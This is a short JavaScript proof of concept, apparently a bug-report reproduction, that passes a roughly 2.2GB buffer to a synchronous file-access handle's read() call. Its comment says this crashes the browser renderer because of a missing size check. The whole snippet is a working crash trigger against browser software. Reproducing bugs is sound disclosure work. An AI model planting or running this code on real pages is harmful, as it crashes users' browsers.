async function f() {
  const root = await navigator.storage.getDirectory();
  const fileHandle = await root.getFileHandle('test', { create: true });
  const handle = fileHandle.createSyncAccessHandle();

  // Create a >2GB buffer
  const bigBuffer = new ArrayBuffer(2200000000);  // ~2.2GB

  // This crashes the renderer — no size check before delegate Read()
  handle.read(bigBuffer);
}

f();
